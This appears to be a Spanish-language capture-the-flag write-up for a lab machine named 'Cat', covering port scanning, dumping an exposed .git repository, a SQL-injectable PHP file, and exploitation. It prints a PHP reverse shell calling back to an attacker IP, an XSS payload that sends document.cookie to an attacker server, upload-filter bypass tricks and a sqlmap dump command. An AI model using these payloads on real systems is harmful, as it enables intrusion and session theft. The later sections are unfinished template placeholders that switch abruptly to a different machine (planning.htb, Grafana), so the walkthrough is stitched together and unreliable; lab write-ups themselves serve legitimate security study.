
# Cat

<figure><img src="/files/wSsQXIIElhaOnI1hP1ue" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Cat`
* **IP:** `10.10.11.53`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟡 Media`
* **Fecha:** `DD-MM-AAAA`

***

## <mark style="color:purple;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.10.11.53 cat.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

```bash
sudo nmap -v -sV -T5 10.10.11.53
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo encontramos puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web.

### Acceso Web

Accedemos a `http://cat.htb` y observamos que parece ser una plataforma de competiciones de belleza de gatos.

<figure><img src="/files/BU9zbyj9JFahOIpcex30" alt=""><figcaption></figcaption></figure>

Tanto en Contest como en Join accedemos a join.php, por lo que nos registraremos para ver la aplicación desde dentro:

<figure><img src="/files/r2n9CbJw4Pj1DUEloB9r" alt=""><figcaption></figcaption></figure>

Una vez que nos logueamos en el apartado Contest encontramos otro formulario que nos permite cargar una foto. Este podría ser el vector de ataque principal si pudieramos subir una reverse shell:

<figure><img src="/files/gNuapFs0ycRZllXE5yI2" alt=""><figcaption></figcaption></figure>

Vamos a cargar una foto normal para ver el funcionamiento:

<figure><img src="/files/dQ65VfIopUuQLGlEylNv" alt=""><figcaption></figcaption></figure>

Se sube correctamente al servidor, con el `Content-Type: image/jpeg`

```
-----------------------------3822259690162446838196846981
Content-Disposition: form-data; name="cat_photo"; filename="cat.jpg"
Content-Type: image/jpeg

ÿØÿà
```

### Subida de webshell

Usaremos la siguiente reverse shell en PHP y la guardaremos como `shell.php.jpg`, haciendo una doble extensión para eludir la blacklist:

{% code title="shell.php.jpg" %}

```php
<?php
// Reemplaza con tu IP y puerto
$ip = '10.10.14.211';  // Dirección IP de tu máquina atacante
$port = 4444;           // Puerto de escucha en tu máquina

// No imprime errores
error_reporting(0);
set_time_limit(0);
$socket = fsockopen($ip, $port);

$proc = proc_open('/bin/sh', array(
  0 => $socket,
  1 => $socket,
  2 => $socket
), $pipes);
?>
```

{% endcode %}

Al subir una reverse shell en PHP nos da el error de formato, por lo que hay más de un filtro de validación:

```
Error: The file is not an image.
```

<figure><img src="/files/UlxbEYzfwl1UJdBVT1B4" alt=""><figcaption></figcaption></figure>

Ese mensaje `"Error: The file is not an image"` indica que además de validar la **extensión y el Content-Type**, el backend probablemente verifica el contenido del archivo, por ejemplo con funciones como `getimagesize()`, `finfo_file()` o alguna librería como `exif_imagetype()` que analiza los primeros bytes del archivo para confirmar que es una imagen válida.

### Incrustar Header JPEG Standard

```bash
(echo -e "\xFF\xD8\xFF"; cat shell.php) > shell.php.jpg
```

Eso tampoco funciona, por lo que vamos a enumerar más información.

***

## <mark style="color:purple;">Enumeración Web</mark>

### Fuzzing de Directorios

```bash
dirsearch -u http://cat.htb -x 400-503                                                                                                           

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Escritorio/machines/htb/cat/reports/http_cat.htb/_25-07-03_21-02-07.txt

Target: http://cat.htb/

[21:02:07] Starting: 
[21:02:11] 301 -  301B  - /.git  ->  http://cat.htb/.git/
[21:02:11] 200 -    7B  - /.git/COMMIT_EDITMSG
[21:02:11] 200 -   92B  - /.git/config
[21:02:11] 200 -   73B  - /.git/description
[21:02:11] 200 -   23B  - /.git/HEAD
[21:02:11] 200 -    2KB - /.git/index
[21:02:11] 200 -  240B  - /.git/info/exclude
[21:02:11] 301 -  311B  - /.git/logs/refs  ->  http://cat.htb/.git/logs/refs/
[21:02:11] 200 -  150B  - /.git/logs/HEAD
[21:02:11] 301 -  317B  - /.git/logs/refs/heads  ->  http://cat.htb/.git/logs/refs/heads/
[21:02:11] 200 -  150B  - /.git/logs/refs/heads/master
[21:02:11] 301 -  312B  - /.git/refs/heads  ->  http://cat.htb/.git/refs/heads/
[21:02:11] 200 -   41B  - /.git/refs/heads/master
[21:02:11] 301 -  311B  - /.git/refs/tags  ->  http://cat.htb/.git/refs/tags/
[21:02:16] 302 -    1B  - /admin.php  ->  /join.php
[21:02:21] 200 -    1B  - /config.php
[21:02:22] 301 -  300B  - /css  ->  http://cat.htb/css/
[21:02:25] 301 -  300B  - /img  ->  http://cat.htb/img/
[21:02:26] 302 -    0B  - /logout.php  ->  /
[21:02:35] 301 -  304B  - /uploads  ->  http://cat.htb/uploads/
```

La presencia del directorio **`.git/` accesible públicamente** representa una **grave fuga de información** y es una puerta de entrada directa para la enumeración de código fuente.

Vamos a descargarlo en local con git-dumper:

```bash
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
```

```bash
python3 git_dumper.py http://cat.htb/.git/ ./cat_source

/home/kali/Escritorio/machines/htb/cat/git-dumper/git_dumper.py:409: SyntaxWarning: invalid escape sequence '\g'
  modified_content = re.sub(UNSAFE, '# \g<0>', content, flags=re.IGNORECASE)
[-] Testing http://cat.htb/.git/HEAD [200]
[-] Testing http://cat.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://cat.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://cat.htb/.gitignore [404]
[-] http://cat.htb/.gitignore responded with status code 404
[-] Fetching http://cat.htb/.git/hooks/post-commit.sample [404]
[-] http://cat.htb/.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://cat.htb/.git/description [200]
[-] Fetching http://cat.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://cat.htb/.git/hooks/post-receive.sample [404]
[-] Fetching http://cat.htb/.git/hooks/commit-msg.sample [200]
[-] http://cat.htb/.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://cat.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://cat.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://cat.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://cat.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://cat.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://cat.htb/.git/info/exclude [200]
[-] Fetching http://cat.htb/.git/objects/info/packs [404]
[-] http://cat.htb/.git/objects/info/packs responded with status code 404
[-] Fetching http://cat.htb/.git/hooks/update.sample [200]
[-] Fetching http://cat.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://cat.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://cat.htb/.git/index [200]
<----SNIP---->
```

Eso nos habrá descargado el repo en local

```shell-session
afsh4ck@kali$ cd cat_source

afsh4ck@kali$ ls -la
drwxrwxr-x kali kali 4.0 KB Thu Jul  3 21:06:12 2025  .
drwxrwxr-x kali kali 4.0 KB Thu Jul  3 21:07:25 2025  ..
drwxrwxr-x kali kali 4.0 KB Thu Jul  3 21:07:38 2025  .git
.rwxrwxr-x kali kali 893 B  Thu Jul  3 21:06:12 2025  accept_cat.php
.rwxrwxr-x kali kali 4.4 KB Thu Jul  3 21:06:12 2025  admin.php
.rwxrwxr-x kali kali 277 B  Thu Jul  3 21:06:12 2025  config.php
.rwxrwxr-x kali kali 6.5 KB Thu Jul  3 21:06:12 2025  contest.php
drwxrwxr-x kali kali 4.0 KB Thu Jul  3 21:06:12 2025  css
.rwxrwxr-x kali kali 1.1 KB Thu Jul  3 21:06:12 2025  delete_cat.php
drwxrwxr-x kali kali 4.0 KB Thu Jul  3 21:06:12 2025  img
drwxrwxr-x kali kali 4.0 KB Thu Jul  3 21:06:12 2025  img_winners
.rwxrwxr-x kali kali 3.4 KB Thu Jul  3 21:06:12 2025  index.php
.rwxrwxr-x kali kali 5.8 KB Thu Jul  3 21:06:12 2025  join.php
.rwxrwxr-x kali kali  79 B  Thu Jul  3 21:06:12 2025  logout.php
.rwxrwxr-x kali kali 2.7 KB Thu Jul  3 21:06:12 2025  view_cat.php
.rwxrwxr-x kali kali 1.6 KB Thu Jul  3 21:06:12 2025  vote.php
drwxrwxr-x kali kali 4.0 KB Thu Jul  3 21:06:12 2025  winners
.rwxrwxr-x kali kali 3.3 KB Thu Jul  3 21:06:12 2025  winners.php
```

### Analizando el repositorio

Leyendo algunos archivos php nos encontramos con un nombre de usuario "`axel`" que parece ser el moderador que acepta las fotos que se suben. Se puede ver la inyección SQL, que ocurre debido a la entrada directa del usuario en las consultas SQL.

{% code title="accept\_cat.php" %}

```php
<?php
include 'config.php';
session_start();

if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST['catId']) && isset($_POST['catName'])) {
            $cat_name = $_POST['catName'];
            $catId = $_POST['catId'];
            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
            $pdo->exec($sql_insert);

            $stmt_delete = $pdo->prepare("DELETE FROM cats WHERE cat_id = :cat_id");
            $stmt_delete->bindParam(':cat_id', $catId, PDO::PARAM_INT);
            $stmt_delete->execute();

            echo "The cat has been accepted and added successfully.";
        } else {
            echo "Error: Cat ID or Cat Name not provided.";
        }
    } else {
        header("Location: /");
        exit();
    }
} else {
    echo "Access denied.";
}
?>
```

{% endcode %}

#### Parte vulnerable del código

```php
$cat_name = $_POST['catName'];
$catId = $_POST['catId'];
$sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
$pdo->exec($sql_insert);
```

### Base de datos

Encontramos el archivo de la base de datos en la ruta /databases/cat.db

{% code title="config.php" %}

```php
<?php
// Database configuration
$db_file = '/databases/cat.db';

// Connect to the database
try {
    $pdo = new PDO("sqlite:$db_file");
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Error: " . $e->getMessage());
}
?>
```

{% endcode %}

## <mark style="color:purple;">Explotación de XSS</mark>

`accept_cat.php` solo está disponible para el administrador Axel.&#x20;

Resulta que necesitamos acceder al área de administración mediante XSS (por ejemplo, robar cookies) y, por lo tanto, usar SQLi para obtener credenciales de la base de datos.

Como no tenemos nada filtrado , podemos utilizar un payload XSS básico:

```bash
< script > document.location = ' http ://10.10.14.211:4443/?c=' + document.cookie ; </script>
```

Antes de subirlo abrimos un servidor local con python por el puerto que le hemos indicado:

```bash
python3 -m http.server 4443
```

Después nos registramos con el payload como nombre de usuario:

<figure><img src="/files/cXkIaeocHRUZjbM7mies" alt=""><figcaption></figcaption></figure>

Iniciamos sesión y subimos una imagen de un gato para que el administrador pueda verla, y así obtener la cookie:

<figure><img src="/files/FSznEfprslGVkK2pntos" alt=""><figcaption></figcaption></figure>

Esperamos unos segundos y obtenemos un rebote de cookie, habilitando el panel de Admin:

A través del SQLi descubierto obtenemos las credenciales:

```q
sqlmap -r req.txt -p catName --level 3 --risk 3 --batch --random-agent --tables --dump --dbms=sqlite --threads 10
```

Donde `req.txt` es la solicitud de endpoint con cookies de administrador:

***

## <mark style="color:purple;">Enumeración de Subdominios (VHosts)</mark>

#### Comprobación de Content-Length

```bash
curl -s -I http://10.10.11.68 -H "Host: defnotvalid.planning.htb" | grep "Content-Length:"

Content-Length: 178
```

#### Fuzzing con FFUF

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://10.10.11.68/ -H 'Host: FUZZ.planning.htb' -fs 178
```

**Encontramos el subdominio:** `grafana.planning.htb`

Lo añadimos a `/etc/hosts` y accedemos a un panel de Grafana v11.0.0.

***

## <mark style="color:purple;">Explotación</mark>

### Investigación de CVEs / Exploits

Exploramos CVEs relacionados con Grafana 11.0.0 en fuentes como:

* <https://sploitus.com>
* <https://exploit-db.com>
* <https://github.com>

**Exploit seleccionado:** *(Describir qué exploit se usó y su URL de referencia)*

### Ejecución del Exploit

Describir paso a paso cómo se logró la ejecución remota o el primer acceso.

***

## <mark style="color:purple;">Acceso Inicial</mark>

Una vez obtenido acceso:

* Verificar usuario actual (`whoami`)
* Verificar entorno (`uname -a`, `id`, `sudo -l`)

***

## <mark style="color:purple;">User Flag</mark>

Ubicación y obtención de la flag del usuario:

```bash
cat /home/<usuario>/user.txt
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

Herramientas usadas:

* `linpeas.sh`
* `pspy`
* `sudo -l`
* `find / -perm -4000 2>/dev/null`

#### Técnica aplicada

Describir la técnica usada: binario con SUID, cronjob mal configurado, credenciales duras, etc.

***

## 👑 <mark style="color:purple;">Root Flag</mark>

```bash
cat /root/root.txt
```
